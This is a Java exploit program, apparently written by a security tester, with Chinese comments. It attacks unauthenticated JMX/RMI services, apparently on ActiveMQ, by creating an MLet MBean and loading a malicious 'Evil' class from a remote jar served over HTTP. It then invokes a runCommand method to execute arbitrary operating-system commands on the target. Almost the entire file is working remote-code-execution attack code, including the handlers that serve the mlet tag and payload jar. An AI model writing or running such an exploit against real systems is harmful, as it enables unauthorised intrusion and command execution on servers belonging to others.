import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Map;

//认证开启
public class no_auth_attack {
    private static String JARNAME = "compromise.jar";
    private static String OBJECTNAME = "MLetCompromise:name=evil,id=1";
    private static String EVILCLASS = "Evil";

    public static void main(String[] args) {
        try {
            //开启Http服务，提供带mlet标签的html和恶意MBean的jar包
//            HttpServer server = HttpServer.create(new InetSocketAddress(4141), 0);
//            server.createContext("/mlet", new MLetHandler());
//            server.createContext("/" + JARNAME, new JarHandler());
//            server.setExecutor(null);
//            server.start();
            //这里可以改成args的参数就可以在命令行下使用了，JMX的ip，端口，要执行的命令
            connectAndOwn("127.0.0.1", "11099", "whoami");

//            server.stop(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void connectAndOwn(String serverName, String port, String command) {
        try {
            //建立连接
            JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port + "/jmxrmi");
            Map<String, String[]> env = new HashMap<>();
            System.out.println("URL: " + u + ", connecting");
            String[] credentials = new String[]{"admin", "activemq"};
            env.put(JMXConnector.CREDENTIALS, credentials);
            JMXConnector c = JMXConnectorFactory.connect(u, null);
            System.out.println("Connected: " + c.getConnectionId());

            MBeanServerConnection m = c.getMBeanServerConnection();

            ObjectInstance evil_bean = null;
            try {
                evil_bean = m.getObjectInstance(new ObjectName(OBJECTNAME));
            } catch (Exception e) {
                evil_bean = null;
            }

            if (evil_bean == null) {
                System.out.println("Trying to create bean...");
                ObjectInstance evil = null;
                try {
                    evil = m.createMBean("javax.management.loading.MLet", null);
                } catch (javax.management.InstanceAlreadyExistsException e) {
                    evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                }

                System.out.println("Loaded " + evil.getClassName());
                //调用 getMBeansFromURL 从远程服务器获取 MBean
                Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL",
                        new Object[] {String.format("http://%s:4141/mlet", InetAddress.getLocalHost().getHostAddress())},
                        new String[] {String.class.getName()}
                );
                HashSet res_set = (HashSet)res;
                Iterator itr = res_set.iterator();
                Object nextObject = itr.next();
                if (nextObject instanceof Exception) {
                    throw ((Exception)nextObject);
                }
                evil_bean = ((ObjectInstance)nextObject);
            }
            //调用恶意 MBean 中用于执行命令的函数
            System.out.println("Loaded class: " + evil_bean.getClassName() + " object " + evil_bean.getObjectName());
            System.out.println("Calling runCommand with: " + command);
            Object result = m.invoke(evil_bean.getObjectName(), "runCommand", new Object[]{command}, new String[]{String.class.getName()});
            System.out.println("Result: " + result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static class MLetHandler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
            /**
             * mlet 标签
             * <MLET
             * CODE = class | OBJECT = serfile
             * ARCHIVE = "archiveList"
             * [CODEBASE = codebaseURL]
             * [NAME = mbeanname]
             * [VERSION = version]
             * >
             * [arglist]
             * </MLET>
             */
            String respone = String.format("<HTML><mlet code=%s archive=%s name=%s></mlet></HTML>", EVILCLASS, JARNAME, OBJECTNAME);
            System.out.println("Sending mlet: " + respone + "\n");
            t.sendResponseHeaders(200, respone.length());
            OutputStream os = t.getResponseBody();
            os.write(respone.getBytes());
            os.close();
        }
    }

    static class JarHandler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
            System.out.println("Request made for JAR...");
            //这里的 compromise.jar 可以根据实际的路径来修改
            File file = new File("/Users/osword/Desktop/active/exp/compromise.jar");
            byte[] bytearray = new byte[(int)file.length()];
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            bis.read(bytearray, 0 , bytearray.length);
            t.sendResponseHeaders(200, file.length());
            OutputStream os = t.getResponseBody();
            os.write(bytearray, 0, bytearray.length);
            os.close();
        }
    }
}